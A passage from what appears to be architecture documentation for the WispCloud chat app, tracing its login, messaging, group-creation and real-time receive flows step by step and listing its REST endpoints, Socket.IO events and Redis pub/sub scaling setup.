          _id: user._id,
          fullName: user.fullName,
          email: user.email,
          username: user.username,
          profilePic: user.profilePic
        });
      };

Step 10: Database query - Find user by email
  ↓ Query: User.findOne({ email }).select("+password")
  ↓ Note: password field excluded by default (select: false in schema)
  ↓ Use +password to include it
  ↓ Uses index on email field
  ↓ If not found: Return "Invalid credentials", STOP

Step 11: Compare password with bcrypt
  ↓ bcrypt.compare(plaintext, hash)
  ↓ Time: ~100-200ms (same as hashing)
  ↓ If mismatch: Return "Invalid credentials", STOP

Step 12: Generate JWT and set cookie
  ↓ Same as signup flow

Step 13: Send response
  ↓ Status: 200 OK
  ↓ Cookie: jwt token
  ↓ Body: User data

Step 14: Frontend updates state
  ↓ set({ authUser: res.data })
  ↓ Shows success toast

Step 15: Connect Socket.IO
  ↓ Establishes WebSocket connection
  ↓ Updates online status in Redis
  ↓ Redirects to HomePage
```

**Security Notes:**
- Same error message for "user not found" vs "wrong password" (prevents user enumeration)
- Rate limiting prevents brute force
- Password never returned in response
- bcrypt comparison is timing-safe

### 3. Send Message Flow (25 Steps)

**Complete flow including Socket.IO broadcast:**

```
Step 1: User types message and clicks Send (or presses Enter)
  ↓ Location: MessageInput.jsx
  ↓ Event: onSubmit

Step 2: Handle typing indicator (when typing)
  ↓ Event: onFocus triggers handleTyping(true)
  ↓ Emits: socket.emit("typing", { receiverId, isTyping: true })
  ↓ Backend: Receives event, gets receiver socket ID from Redis
  ↓ Backend: Emits to receiver: io.to(receiverSocketId).emit("userTyping", ...)
  ↓ Receiver UI: Shows "typing..." indicator

Step 3: Call useChatStore.sendMessage()
  ↓ Code:
      const sendMessage = async (messageData) => {
        const { selectedUser, messages } = get();
        try {
          const res = await axiosInstance.post(
            `/messages/send/${selectedUser._id}`,
            messageData
          );
          set({ messages: [...messages, res.data] });
        } catch (error) {
          toast.error(error.response?.data?.message);
        }
      };

Step 4: Axios POST request
  ↓ URL: /api/messages/send/:id
  ↓ Params: :id = receiverId
  ↓ Body: { text, image, replyTo }
  ↓ Headers: Cookie: jwt=<token>

Step 5: Backend receives request
  ↓ Middleware chain begins

Step 6: Global rate limiter
  ↓ 500-1000 req/15min

Step 7: Route matching
  ↓ Location: routes/messageRoutes.js
  ↓ Route:
      router.post("/send/:id",
        protectRoute,              // Auth middleware
        messageLimiter,            // 50 messages/minute
        validate(userIdParamSchema, 'params'),
        validate(sendMessageSchema),
        sendMessage                // Controller
      );

Step 8: protectRoute middleware
  ↓ Location: middleware/auth.middleware.js
  ↓ Code:
      export const protectRoute = async (req, res, next) => {
        try {
          const token = req.cookies.jwt;

          if (!token) {
            return res.status(401).json({ message: "No Token Provided" });
          }

          const decoded = jwt.verify(token, process.env.JWT_SECRET);

          if (!decoded) {
            return res.status(401).json({ message: "Invalid Token" });
          }

          const user = await User.findById(decoded.userId).select("-password");

          if (!user) {
            return res.status(404).json({ message: "User not found" });
          }

          req.user = user;  // Attach user to request
          next();
        } catch (error) {
          res.status(500).json({ message: "Internal server error" });
        }
      };

Step 9: JWT verification
  ↓ Extract token from cookie
  ↓ Verify signature with JWT_SECRET
  ↓ Check expiration
  ↓ If invalid: 401 Unauthorized, STOP

Step 10: Load user from database
  ↓ Query: User.findById(decoded.userId).select("-password")
  ↓ Uses _id index (very fast)
  ↓ Attaches user to req.user

Step 11: Message rate limiter
  ↓ 50 messages per minute
  ↓ Redis-backed (shared across instances)
  ↓ If exceeded: 429 Too Many Requests, STOP

Step 12: Validate params
  ↓ Check :id is valid MongoDB ObjectId

Step 13: Validate body
  ↓ Schema:
      sendMessageSchema = z.object({
        text: z.string().optional(),
        image: z.string().optional(),
        replyTo: z.string().optional()
      }).refine(data => data.text || data.image, {
        message: "Either text or image required"
      });

Step 14: sendMessage controller
  ↓ Location: controllers/message.controllers.js
  ↓ Code:
      export const sendMessage = async (req, res) => {
        try {
          const { text, image, replyTo } = req.body;
          const { id: receiverId } = req.params;
          const senderId = req.user._id;

          let imageUrl;
          if (image) {
            const uploadResponse = await cloudinary.uploader.upload(image);
            imageUrl = uploadResponse.secure_url;
          }

          const newMessage = new Message({
            senderId,
            receiverId,
            text,
            image: imageUrl,
            replyTo: replyTo || null
          });

          await newMessage.save();

          // Populate replyTo field
          await newMessage.populate({
            path: 'replyTo',
            select: 'text image senderId createdAt',
            populate: {
              path: 'senderId',
              select: 'username fullName profilePic'
            }
          });

          // Get receiver's socket ID from Redis
          const receiverSocketId = await getReceiverSocketId(receiverId);
          if (receiverSocketId) {
            io.to(receiverSocketId).emit("newMessage", newMessage);
          }

          res.status(201).json(newMessage);
        } catch (error) {
          res.status(500).json({ error: "Internal server error" });
        }
      };

Step 15: Image upload (if present)
  ↓ Service: Cloudinary
  ↓ Upload base64 image
  ↓ Returns: { secure_url, public_id }
  ↓ Time: 500-2000ms (depends on image size/network)

Step 16: Create message document
  ↓ new Message({ senderId, receiverId, text, image, replyTo })

Step 17: Save to MongoDB
  ↓ newMessage.save()
  ↓ Inserts into messages collection
  ↓ Indexes updated: senderId, receiverId, createdAt

Step 18: Populate replyTo field
  ↓ If message is a reply, fetch the original message
  ↓ Also populate sender info of original message
  ↓ Results in nested object for UI

Step 19: Get receiver's socket ID from Redis
  ↓ Location: lib/redis.js
  ↓ Function: getSocketIdByUserId(receiverId)
  ↓ Code:
      export const getSocketIdByUserId = async (userId) => {
        try {
          const client = getRedisClient();
          return await client.get(`user:${userId}:socketId`);
        } catch (error) {
          return null;
        }
      };
  ↓ Redis key: user:<userId>:socketId
  ↓ Returns: socket_ABC123 or null (if offline)

Step 20: Emit Socket.IO event to receiver
  ↓ Location: lib/socket.js
  ↓ Code: io.to(receiverSocketId).emit("newMessage", newMessage)
  ↓ Event: "newMessage"
  ↓ Payload: Complete message object
  ↓ Only sent to specific socket ID (not broadcast to all)

Step 21: Receiver's browser receives Socket.IO event
  ↓ Location: useChatStore.subscribeToMessages()
  ↓ Code:
      socket.on("newMessage", (newMessage) => {
        const isMessageSentFromSelectedUser =
          newMessage.senderId === selectedUser._id;

        if (!isMessageSentFromSelectedUser) return;

        set({ messages: [...get().messages, newMessage] });
      });
  ↓ Checks if message is from currently selected user
  ↓ If yes: Append to messages array
  ↓ If no: Ignore (don't update UI)

Step 22: Receiver's UI updates
  ↓ React re-renders ChatContainer
  ↓ New message appears in chat
  ↓ Scrolls to bottom
  ↓ Play notification sound (if implemented)

Step 23: Send HTTP response to sender
  ↓ Status: 201 Created
  ↓ Body: Complete message object (with _id, createdAt, etc.)

Step 24: Sender's frontend receives response
  ↓ Location: useChatStore.sendMessage()
  ↓ Updates: set({ messages: [...messages, res.data] })

Step 25: Sender's UI updates
  ↓ Message appears in chat (optimistic update already showed it)
  ↓ Now has server-generated _id and timestamp
  ↓ Clear input field
  ↓ Stop typing indicator
```

**Optimizations:**
- Socket.IO for instant delivery (no polling)
- Redis for O(1) socket ID lookup
- Indexed database queries
- Optimistic UI updates (show message before server response)

**Failure Handling:**
- If receiver offline: Message saved to DB, delivered when they reconnect
- If image upload fails: Show error, don't save message
- If rate limit hit: 429 error, show toast to user
- If socket disconnected: HTTP response still works, message in DB

### 4. Create Group Flow (22 Steps)

```
Step 1: User clicks "Create Group" button
  ↓ Location: GroupsSidebar.jsx
  ↓ Opens CreateGroupModal

Step 2: User fills group details
  ↓ Name: "Project Team"
  ↓ Description: "Team collaboration"
  ↓ Upload group image (optional)
  ↓ Select participants (checkboxes)

Step 3: User clicks "Create Group" button
  ↓ Location: CreateGroupModal.jsx
  ↓ Event: onSubmit

Step 4: Client-side validation
  ↓ Check: groupName.length >= 3 && <= 30
  ↓ Check: selectedParticipants.length > 0
  ↓ Check: users.length > 0 (has contacts)
  ↓ If invalid: Show toast, STOP

Step 5: Prevent duplicate submission
  ↓ Check: isSubmitting || submittingRef.current
  ↓ Set both flags to true
  ↓ Prevents double-click issues

Step 6: Call useGroupStore.createGroup()
  ↓ Code:
      const createGroup = async (groupData) => {
        try {
          const res = await axiosInstance.post('/groups', groupData);
          set((state) => ({ groups: [...state.groups, res.data] }));
          toast.success('Group created successfully');
          return res.data;
        } catch (error) {
          if (error.response?.status === 429) {
            toast.error('Too many requests. Please wait.');
          } else {
            toast.error(error.response?.data?.error);
          }
          throw error;
        }
      };

Step 7: Axios POST to /api/groups
  ↓ Body: { name, description, groupImage, type, maxMembers, settings }
  ↓ Headers: Cookie: jwt=<token>

Step 8: Backend middleware chain
  ↓ Helmet → Body parser → CORS → Global rate limiter

Step 9: Route matching
  ↓ Location: routes/group.routes.js
  ↓ Route:
      router.post('/',
        protectRoute,
        validate(createGroupSchema),
        createGroup
      );

Step 10: protectRoute middleware
  ↓ Verify JWT, load user

Step 11: Validation middleware
  ↓ Schema:
      createGroupSchema = z.object({
        name: z.string().min(3).max(50),
        description: z.string().max(500).optional(),
        groupImage: z.string().optional(),
        type: z.enum(['public', 'private']).default('private'),
        maxMembers: z.number().min(2).max(1000).default(100),
        settings: z.object({
          whoCanMessage: z.enum(['all', 'admins_only']).default('all'),
          whoCanAddMembers: z.enum(['all', 'admins_only', 'owner_only']).default('admins_only'),
          requireApproval: z.boolean().default(false)
        }).optional()
      });

Step 12: createGroup controller
  ↓ Location: controllers/group.controllers.js
  ↓ Code:
      export const createGroup = async (req, res) => {
        try {
          const { name, description, groupImage, type, maxMembers, settings } = req.body;
          const userId = req.user._id;

          if (!name || name.trim().length < 3) {
            return res.status(400).json({ error: 'Group name must be at least 3 characters' });
          }

          // Create the group
          const group = await Group.create({
            name,
            description,
            groupImage: groupImage || '',
            createdBy: userId,
            type: type || 'private',
            maxMembers: maxMembers || 100,
            settings: settings || {}
          });

          // Add creator as owner
          await GroupMember.create({
            groupId: group._id,
            userId: userId,
            role: 'owner',
            status: 'active'
          });

          // Populate creator details
          const populatedGroup = await Group.findById(group._id)
            .populate('createdBy', 'username email profilePic');

          res.status(201).json(populatedGroup);
        } catch (error) {
          res.status(500).json({ error: 'Internal server error' });
        }
      };

Step 13: Create group document
  ↓ Collection: groups
  ↓ Document:
      {
        _id: ObjectId("..."),
        name: "Project Team",
        description: "Team collaboration",
        groupImage: "",
        createdBy: ObjectId("userId"),
        type: "private",
        maxMembers: 100,
        settings: {
          whoCanMessage: "all",
          whoCanAddMembers: "admins_only",
          requireApproval: false
        },
        stats: {
          totalMembers: 1,
          totalMessages: 0
        },
        isActive: true,
        createdAt: ISODate("..."),
        updatedAt: ISODate("...")
      }

Step 14: Create group member document (creator as owner)
  ↓ Collection: groupmembers
  ↓ Document:
      {
        _id: ObjectId("..."),
        groupId: ObjectId("groupId"),
        userId: ObjectId("userId"),
        role: "owner",
        status: "active",
        permissions: {
          canSendMessages: true,
          canAddMembers: true,
          canRemoveMembers: true,
          canEditGroup: true
        },
        isMuted: false,
        joinedAt: ISODate("..."),
        lastReadAt: ISODate("...")
      }
  ↓ Note: Pre-save middleware automatically sets permissions based on role

Step 15: Populate creator details
  ↓ Query: Group.findById().populate('createdBy')
  ↓ Joins User collection
  ↓ Returns group with creator: { username, email, profilePic }

Step 16: Send HTTP response
  ↓ Status: 201 Created
  ↓ Body: Populated group object

Step 17: Frontend receives response
  ↓ Location: useGroupStore.createGroup()
  ↓ Updates state: groups array + new group
  ↓ Shows success toast
  ↓ Returns group object

Step 18: Call useGroupStore.addMembers()
  ↓ Code:
      const addMembers = async (groupId, userIds) => {
        try {
          const res = await axiosInstance.post(
            `/groups/${groupId}/members`,
            { userIds }
          );
          toast.success('Members added successfully');
          return res.data;
        } catch (error) {
          toast.error(error.response?.data?.error);
          throw error;
        }
      };
  ↓ Parameters: groupId, [user1Id, user2Id, user3Id]

Step 19: Axios POST to /api/groups/:groupId/members
  ↓ Body: { userIds: [...] }

Step 20: Backend addMember controller
  ↓ Location: controllers/group.controllers.js
  ↓ Validates:
      - User has permission to add members
      - Group not at max capacity
      - All user IDs are valid
  ↓ For each user:
      - Check if already a member
      - If banned/left: Reactivate
      - Else: Create new GroupMember document
  ↓ Updates group.stats.totalMembers

Step 21: Emit Socket.IO events to new members
  ↓ For each added member (if online):
      const socketId = await getSocketIdByUserId(memberId);
      if (socketId) {
        io.to(socketId).emit("groupJoined", { groupId });
      }
  ↓ Frontend listens:
      socket.on("groupJoined", ({ groupId }) => {
        get().getUserGroups();  // Refresh groups list
      });

Step 22: Close modal and update UI
  ↓ Location: CreateGroupModal.jsx
  ↓ onClose() called
  ↓ Reset form state
  ↓ GroupsSidebar shows new group
  ↓ User can now select and chat in group
```

**Transaction Considerations:**
- Group and GroupMember created separately (not atomic)
- If GroupMember creation fails, group still exists (orphaned)
- Could use MongoDB transactions in future:
  ```javascript
  const session = await mongoose.startSession();
  session.startTransaction();
  try {
    const group = await Group.create([groupData], { session });
    await GroupMember.create([memberData], { session });
    await session.commitTransaction();
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    session.endSession();
  }
  ```

### 5. Receive Real-Time Message Flow (18 Steps)

**Receiver's perspective when someone sends them a message:**

```
Step 1: Receiver is on HomePage with ChatContainer open
  ↓ Location: ChatContainer.jsx
  ↓ subscribeToMessages() already called in useEffect

Step 2: Sender sends message (see "Send Message Flow" above)
  ↓ Message saved to database
  ↓ Backend gets receiver's socket ID from Redis

Step 3: Backend emits Socket.IO event
  ↓ Location: controllers/message.controllers.js
  ↓ Code:
      const receiverSocketId = await getReceiverSocketId(receiverId);
      if (receiverSocketId) {
        io.to(receiverSocketId).emit("newMessage", newMessage);
      }
  ↓ Event: "newMessage"
  ↓ Target: Specific socket ID
  ↓ Payload: Full message object

Step 4: Socket.IO server sends event over WebSocket
  ↓ Protocol: WebSocket (ws://)
  ↓ Persistent connection (already established)
  ↓ Low latency: <50ms typically

Step 5: Receiver's browser receives WebSocket frame
  ↓ Browser's WebSocket API handles it
  ↓ socket.io-client library decodes event

Step 6: Event handler fires
  ↓ Location: useChatStore.subscribeToMessages()
  ↓ Code:
      const subscribeToMessages = () => {
        const { selectedUser } = get();
        if (!selectedUser) return;

        const socket = useAuthStore.getState().socket;

        socket.on("newMessage", (newMessage) => {
          const isMessageSentFromSelectedUser =
            newMessage.senderId === selectedUser._id;

          if (!isMessageSentFromSelectedUser) return;

          set({ messages: [...get().messages, newMessage] });
        });

        socket.on("messagesRead", (data) => {
          const { messageIds, readAt } = data;
          set((state) => ({
            messages: state.messages.map((msg) =>
              messageIds.includes(msg._id)
                ? { ...msg, status: "read", readAt }
                : msg
            )
          }));
        });
      };

Step 7: Check if message is from selected user
  ↓ Compare: newMessage.senderId === selectedUser._id
  ↓ If NO: Ignore (don't update UI)
  ↓ If YES: Continue

Step 8: Update Zustand store
  ↓ Action: set({ messages: [...get().messages, newMessage] })
  ↓ Immutably append new message to array
  ↓ Triggers re-render of all components using useChatStore

Step 9: React re-renders ChatContainer
  ↓ Component re-executes
  ↓ messages array now has +1 element

Step 10: Re-render message list
  ↓ Code:
      {messages.map((message) => (
        <div key={message._id} className={`chat ${
          message.senderId === authUser._id ? "chat-end" : "chat-start"
        }`}>
          <div className="chat-bubble">
            {message.text}
          </div>
        </div>
      ))}
  ↓ New message appears at bottom

Step 11: Auto-scroll to bottom
  ↓ Code:
      const messageEndRef = useRef(null);

      useEffect(() => {
        if (messageEndRef.current && messages) {
          messageEndRef.current.scrollIntoView({ behavior: "smooth" });
        }
      }, [messages]);
  ↓ Smooth scroll animation

Step 12: Mark messages as read (if chat is visible)
  ↓ Automatic call in useEffect
  ↓ Function: markMessagesAsRead(selectedUser._id)
  ↓ API call: PUT /api/messages/read/:userId

Step 13: Backend updates message status
  ↓ Controller: markMessagesAsRead
  ↓ Query:
      await Message.updateMany(
        {
          senderId: senderId,
          receiverId: receiverId,
          status: { $ne: 'read' }
        },
        {
          $set: {
            status: 'read',
            readAt: new Date()
          }
        }
      );

Step 14: Backend emits read receipt to sender
  ↓ Code:
      const senderSocketId = await getReceiverSocketId(senderId);
      if (senderSocketId) {
        io.to(senderSocketId).emit("messagesRead", {
          readBy: receiverId,
          messageIds: readMessages.map(m => m._id),
          readAt: new Date()
        });
      }

Step 15: Sender receives read receipt
  ↓ Event: "messagesRead"
  ↓ Handler in useChatStore
  ↓ Updates message status from "sent" → "read"

Step 16: Sender's UI shows checkmarks
  ↓ Double checkmark icon (✓✓)
  ↓ Blue color (read)
  ↓ Shows readAt timestamp on hover

Step 17: Play notification sound (if implemented)
  ↓ Check: Is window focused?
  ↓ Check: Are notifications enabled?
  ↓ Play: audio.play()

Step 18: Update notification badge (if in background)
  ↓ If user is on different chat:
      - Show unread count badge on sender's avatar in Sidebar
      - Update browser tab title: "(1) Wisp"
  ↓ If user is on different tab/window:
      - Show browser notification
      - Update favicon with badge
```

**Performance Considerations:**
- WebSocket: No HTTP overhead, persistent connection
- React: Only re-renders components subscribed to changed state
- Virtual DOM: Efficiently updates only new message bubble
- Auto-scroll: Uses requestAnimationFrame for smooth animation

**Edge Cases Handled:**
- User switches chat mid-receive: Message ignored (not from selectedUser)
- Multiple messages arrive quickly: All batched in single re-render
- User offline: Messages queued, delivered when reconnect
- Socket disconnected: Auto-reconnect (Socket.IO feature)
- Duplicate events: React key={message._id} prevents duplicates

> **Interview Question:** "What happens if a message arrives while the user is on a different chat?"
>
> **Answer:** The message is received via Socket.IO and the event handler fires, but there's a check: `if (newMessage.senderId !== selectedUser._id) return;`. This ensures messages are only added to the UI if they're from the currently selected conversation. The message is still in the database, and when the user switches to that chat, `getMessages()` is called to fetch all messages including the one that arrived earlier. This prevents confusion and keeps the UI clean.

---

## 4.4 Communication Patterns

WispCloud uses three primary communication patterns: REST API for request/response, WebSocket for real-time events, and Redis Pub/Sub for scaling.

### REST API Pattern

**All HTTP Endpoints Documented:**

#### Authentication Endpoints (routes/auth.route.js)

```javascript
POST   /api/auth/signup
  Body: { fullName, email, password, username }
  Response: { _id, fullName, email, username, profilePic }
  Rate Limit: 100 req/15min (dev), 20 req/15min (prod)
  Cookie: jwt token (httpOnly, 7 days)

POST   /api/auth/login
  Body: { email, password }
  Response: { _id, fullName, email, username, profilePic }
  Rate Limit: 100 req/15min (dev), 20 req/15min (prod)
  Cookie: jwt token

POST   /api/auth/logout
  Response: { message: "Logged out successfully" }
  Clears: jwt cookie

PUT    /api/auth/update-profile
  Middleware: protectRoute, uploadLimiter (10 uploads/hour)
  Body: { profilePic: "base64..." }
  Response: Updated user object

GET    /api/auth/check
  Middleware: protectRoute
  Response: Current user object (from req.user)
  Purpose: Verify JWT and get user data on app load

GET    /api/auth/methods
  Response: { emailPassword: true, oauth: { google: true/false } }
  Purpose: Check which auth methods are configured
```

#### OAuth Endpoints (routes/oauth.routes.js)

```javascript
GET    /api/auth/oauth/google
  Middleware: passport.authenticate('google', { scope: ['profile', 'email'] })
  Action: Redirects to Google OAuth consent screen

GET    /api/auth/oauth/google/callback
  Middleware: passport.authenticate('google')
  Action: Handles Google callback, creates/logs in user
  Redirects: Frontend with JWT in cookie
```

#### Message Endpoints (routes/messageRoutes.js)

```javascript
GET    /api/messages/users
  Middleware: protectRoute, userDataLimiter (100 req/min)
  Response: [ { _id, username, fullName, email, profilePic }, ... ]
  Purpose: Get all users with accepted chat invites

GET    /api/messages/:id
  Middleware: protectRoute
  Params: :id = userId (other person)
  Query: ?limit=50&cursor=<messageId>
  Response: {
    messages: [...],
    pagination: {
      hasMore: boolean,
      nextCursor: string | null,
      limit: number
    }
  }
  Purpose: Get message history with cursor pagination

POST   /api/messages/send/:id
  Middleware: protectRoute, messageLimiter (50 msg/min)
  Params: :id = receiverId
  Body: { text?, image?, replyTo? }
  Response: Message object with populated replyTo
  Side Effect: Emits Socket.IO "newMessage" event to receiver

PUT    /api/messages/read/:id
  Middleware: protectRoute
  Params: :id = senderId (whose messages to mark read)
  Response: { message: "Messages marked as read", count: number }
  Side Effect: Emits Socket.IO "messagesRead" event to sender
```

#### Group Endpoints (routes/group.routes.js)

```javascript
POST   /api/groups
  Middleware: protectRoute
  Body: { name, description?, groupImage?, type?, maxMembers?, settings? }
  Response: Created group with populated createdBy
  Side Effect: Creates GroupMember with role "owner"

GET    /api/groups/user/groups
  Middleware: protectRoute
  Response: [ { ...group, memberRole, memberPermissions }, ... ]
  Purpose: Get all groups user is a member of

GET    /api/groups/:groupId
  Middleware: protectRoute
  Params: :groupId
  Response: { group: {...}, membership: {...} }
  Purpose: Get group details and user's membership

PUT    /api/groups/:groupId
  Middleware: protectRoute
  Params: :groupId
  Body: { name?, description?, groupImage?, type?, maxMembers?, settings? }
  Response: Updated group
  Permission: Requires canEditGroup permission

DELETE /api/groups/:groupId
  Middleware: protectRoute
  Params: :groupId
  Response: { message: "Group deleted successfully" }
  Permission: Owner only
  Side Effect: Deletes all GroupMembers and Messages

GET    /api/groups/:groupId/members
  Middleware: protectRoute
  Params: :groupId
  Response: [ { _id, userId: {...}, role, permissions, ... }, ... ]
  Permission: Must be group member

POST   /api/groups/:groupId/members
  Middleware: protectRoute
  Params: :groupId
  Body: { userIds: ["userId1", "userId2", ...] }
  Response: [ Created GroupMembers ]
  Permission: Requires canAddMembers permission
  Side Effect: Emits "groupJoined" Socket.IO event to each added member

DELETE /api/groups/:groupId/members/:memberId
  Middleware: protectRoute
  Params: :groupId, :memberId
  Response: { message: "Member removed successfully" }
  Permission: Requires canRemoveMembers permission
  Side Effect: Sets member status to "left"

PUT    /api/groups/:groupId/members/:memberId/role
  Middleware: protectRoute
  Params: :groupId, :memberId
  Body: { role: "admin" | "member" }
  Response: Updated GroupMember
  Permission: Owner only

POST   /api/groups/:groupId/leave
  Middleware: protectRoute
  Params: :groupId
  Response: { message: "Successfully left the group" }
  Restriction: Owner cannot leave (must transfer ownership first)

GET    /api/groups/:groupId/messages
  Middleware: protectRoute
  Params: :groupId
  Query: ?limit=50&cursor=<messageId>
  Response: { messages: [...], pagination: {...} }

POST   /api/groups/:groupId/messages
  Middleware: protectRoute, messageLimiter
  Params: :groupId
  Body: { text?, image?, replyTo? }
  Response: Created message
  Permission: Requires canSendMessages permission
  Side Effect: Emits "newGroupMessage" to all group members via Socket.IO rooms

DELETE /api/groups/:groupId/messages/:messageId
  Middleware: protectRoute
  Params: :groupId, :messageId
  Response: { message: "Message deleted" }
  Permission: Sender or admin/owner
  Side Effect: Emits "groupMessageDeleted" event

PUT    /api/groups/:groupId/messages/read
  Middleware: protectRoute
  Params: :groupId
  Response: { message: "Messages marked as read", count: number }
  Purpose: Update lastReadAt for user's group membership
```

#### Chat Invite Endpoints (routes/chatInvite.routes.js)

```javascript
GET    /api/invites/pending
  Middleware: protectRoute
  Response: [ { _id, senderId: {...}, status, createdAt }, ... ]
  Purpose: Get all pending invites received by current user

POST   /api/invites/send
  Middleware: protectRoute
  Body: { receiverId }
  Response: Created ChatInvite or existing invite
  Validation: Cannot invite self, check if already connected

PUT    /api/invites/:id/accept
  Middleware: protectRoute
  Params: :id = inviteId
  Response: Updated invite with status "accepted"
  Side Effect: Both users can now DM

PUT    /api/invites/:id/reject
  Middleware: protectRoute
  Params: :id = inviteId
  Response: Updated invite with status "rejected"

DELETE /api/invites/:id
  Middleware: protectRoute
  Params: :id = inviteId
  Response: { message: "Invite deleted" }
  Purpose: Cancel sent invite
```

#### User Endpoints (routes/user.routes.js)

```javascript
GET    /api/users/search
  Middleware: protectRoute
  Query: ?q=<searchQuery>
  Response: [ { _id, username, fullName, email, profilePic }, ... ]
  Purpose: Search users by username or email (for sending invites)

GET    /api/users/:id
  Middleware: protectRoute
  Params: :id = userId
  Response: User object (without password)
  Purpose: Get user profile
```

#### Analytics Endpoints (routes/analytics.routes.js)

```javascript
GET    /api/analytics/stats
  Middleware: protectRoute, requireAdmin
  Response: {
    totalUsers: number,
    totalMessages: number,
    totalGroups: number,
    activeUsers: number,  // Users active in last 24h
    messagesLast24h: number,
    userGrowth: number    // % change from last 7 days
  }
  Permission: Admin only

GET    /api/analytics/messages/trends
  Middleware: protectRoute, requireAdmin
  Query: ?period=7d|30d|90d
  Response: [ { date, count }, ... ]
  Purpose: Message volume over time

GET    /api/analytics/users/activity
  Middleware: protectRoute, requireAdmin
  Response: [ { userId, username, messageCount, lastActive }, ... ]
  Purpose: User activity report
```

**Common Response Patterns:**

Success:
```json
{
  "_id": "...",
  "field": "value",
  ...
}
```

Error:
```json
{
  "message": "Error description",
  "error": "Error type"
}
```

Rate Limit Exceeded:
```json
{
  "error": "Too many requests, please try again later."
}
```

Headers:
```
RateLimit-Limit: 100
RateLimit-Remaining: 95
RateLimit-Reset: 1234567890
```

### WebSocket Events Pattern (Socket.IO)

**All Socket.IO Events Documented:**

#### Connection Events

```javascript
// Client → Server
"connection"
  Query: { userId: string }
  Description: Client connects with userId
  Server Actions:
    1. Store socket-user mapping in Redis
    2. Set user online in Redis Set
    3. Join user's group rooms
    4. Emit "getOnlineUsers" to all clients

// Server → Client
"getOnlineUsers"
  Payload: string[]  // Array of user IDs
  When: On connect, disconnect, or status change
  Purpose: Update online user list in UI

// Client → Server
"disconnect"
  Description: Client disconnects (close tab, network issue)
  Server Actions:
    1. Remove socket mapping from Redis
    2. Remove user from online Set
    3. Emit "getOnlineUsers" to all clients
```

#### Direct Message Events

```javascript
// Client → Server
"typing"
  Payload: { receiverId: string, isTyping: boolean }
  Server Action:
    1. Get receiver's socket ID from Redis
    2. Emit "userTyping" to receiver's socket

// Server → Client
"userTyping"
  Payload: { senderId: string, isTyping: boolean }
  When: Other user starts/stops typing
  UI Action: Show/hide "typing..." indicator

// Server → Client
"newMessage"
  Payload: {
    _id: string,
    senderId: string,
    receiverId: string,
    text?: string,
    image?: string,
    replyTo?: object,
    createdAt: string,
    status: "sent"
  }
  When: Someone sends you a message
  Trigger: POST /api/messages/send/:id
  UI Action: Append to messages array (if selected chat)

// Server → Client
"messagesRead"
  Payload: {
    readBy: string,      // User who read
    messageIds: string[], // Which messages
    readAt: string       // Timestamp
  }
  When: Other user marks your messages as read
  Trigger: PUT /api/messages/read/:id
  UI Action: Update message status, show double checkmark
```

#### Group Chat Events

```javascript
// Client → Server
"groupTyping"
  Payload: { groupId: string, isTyping: boolean }
  Server Action:
    socket.to(groupId).emit("userTypingInGroup", {
      groupId,
      senderId: userId,
      isTyping
    });

// Server → Client
"userTypingInGroup"
  Payload: { groupId: string, senderId: string, isTyping: boolean }
  When: Group member starts/stops typing
  UI Action: Show "John is typing..." under group name

// Client → Server
"joinGroup"
  Payload: { groupId: string }
  Description: Join Socket.IO room for group
  Server Action:
    1. Verify user is group member
    2. socket.join(groupId)
    3. Emit "groupJoined" confirmation

// Server → Client
"groupJoined"
  Payload: { groupId: string }
  When: Successfully joined group room
  UI Action: Refresh groups list

// Client → Server
"leaveGroup"
  Payload: { groupId: string }
  Description: Leave Socket.IO room
  Server Action: socket.leave(groupId)

// Server → Client
"newGroupMessage"
  Payload: {
    message: {
      _id: string,
      senderId: { username, fullName, profilePic },
      receiverId: string,  // groupId
      text?: string,
      image?: string,
      isGroupMessage: true,
      createdAt: string
    },
    groupId: string
  }
  When: Someone sends message to group
  Trigger: POST /api/groups/:groupId/messages
  Broadcast: io.to(groupId).emit(...)  // All group members
  UI Action: Append to groupMessages (if selected group)

// Server → Client
"groupMessageDeleted"
  Payload: { messageId: string, groupId: string }
  When: Message deleted from group
  Trigger: DELETE /api/groups/:groupId/messages/:messageId
  UI Action: Remove message from UI
```

#### Group Management Events

```javascript
// Server → Client
"groupUpdated"
  Payload: { groupId: string, updates: {...} }
  When: Group name/settings changed
  UI Action: Update group in list

// Server → Client
"memberAdded"
  Payload: { groupId: string, member: {...} }
  When: New member added to group
  Broadcast: To all group members
  UI Action: Refresh member list

// Server → Client
"memberRemoved"
  Payload: { groupId: string, memberId: string }
  When: Member removed from group
  UI Action: Remove from member list

// Server → Client
"roleUpdated"
  Payload: { groupId: string, memberId: string, newRole: string }
  When: Member role changed
  UI Action: Update member list, update permissions
```

**Socket.IO Rooms:**

Rooms are used for group broadcasting:

```javascript
// Server side (lib/socket.js)
io.on("connection", async (socket) => {
  const userId = socket.handshake.query.userId;

  // Join all user's groups as rooms
  const userGroups = await GroupMember.find({
    userId,
    status: 'active'
  });

  for (const membership of userGroups) {
    socket.join(membership.groupId.toString());
  }

  // Emit to specific room
  io.to(groupId).emit("newGroupMessage", message);
});
```

Benefits:
- Efficient broadcasting (only to group members)
- Automatic management (leave on disconnect)
- Scalable with Redis adapter

### Pub/Sub Pattern (Redis Adapter)

**For Multi-Instance Scalability:**

When running multiple backend instances (e.g., Docker Swarm, Kubernetes), Socket.IO needs to communicate across instances.

**Problem:**
```
User A connected to Instance 1
User B connected to Instance 2
User A sends message to User B
Instance 1 has User B's socket ID, but socket is on Instance 2
How to deliver?
```

**Solution: Redis Pub/Sub Adapter**

```javascript
// lib/socket.js
import { createAdapter } from "@socket.io/redis-adapter";
import { createClient } from "redis";

export const initializeSocketIO = async () => {
  const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

  // Create two Redis clients (pub and sub)
  const pubClient = createClient({ url: redisUrl });
  const subClient = pubClient.duplicate();

  await Promise.all([
    pubClient.connect(),
    subClient.connect()
  ]);

  // Attach adapter to Socket.IO
  io.adapter(createAdapter(pubClient, subClient));

  console.log('✅ Socket.IO Redis Adapter initialized');
};
```

**How it works:**

```
Instance 1                        Redis                      Instance 2
    |                               |                             |
    | socket.emit("msg", data)      |                             |
    |------------------------------>|                             |
    |    PUBLISH socket.io#/#       |                             |
    |         {event, data}         |                             |
    |                               |                             |
    |                               |---SUBSCRIBE socket.io#/#--->|
    |                               |    {event, data}            |
    |                               |                             |
    |                               |          Broadcast to       |
    |                               |          local sockets      |
    |                               |                             |---> User B
```

**Benefits:**
1. Transparent: No code changes needed
2. Scalable: Add instances without configuration
3. Reliable: Redis persistence ensures delivery
4. Efficient: Only broadcasts to instances with listeners

**Redis Channels Used:**
